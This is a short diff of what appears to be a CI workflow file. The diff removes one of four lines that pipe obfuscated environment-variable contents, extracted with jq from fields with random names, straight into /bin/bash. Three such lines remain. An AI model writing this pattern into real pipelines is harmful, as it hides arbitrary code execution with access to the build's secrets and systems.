@@ -21,7 +21,6 @@ jobs:
           echo $iphv712 | jq -r .g2649 | /bin/bash
           printf '%s' "$tsm23" | jq -r .v1886 | /bin/bash
           echo $uyysv42 | jq -r .puiss3210 | /bin/bash
-          echo $dyl98 | jq -r .daaa14296 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
